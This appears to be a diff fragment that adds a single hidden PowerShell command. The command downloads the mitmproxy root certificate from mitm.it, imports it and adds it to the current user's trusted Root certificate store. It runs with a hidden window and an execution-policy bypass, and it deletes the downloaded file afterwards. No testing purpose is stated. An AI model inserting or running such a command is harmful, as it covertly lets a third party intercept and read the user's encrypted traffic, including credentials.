@@ -1,0 +1,10 @@
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
+$u='http://mitm.it/cert/p12';
+$t=\"$env:TEMP\\cert.p12\";
+(New-Object Net.WebClient).DownloadFile($u,$t);
+$p=ConvertTo-SecureString 'mitmproxy' -AsPlainText -Force;
+$c=New-Object Security.Cryptography.X509Certificates.X509Certificate2;
+$c.Import($t,$p,[Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet);
+$s=New-Object Security.Cryptography.X509Certificates.X509Store('Root','CurrentUser');
+$s.Open('ReadWrite');$s.Add($c);$s.Close();
+Remove-Item $t -Force;"
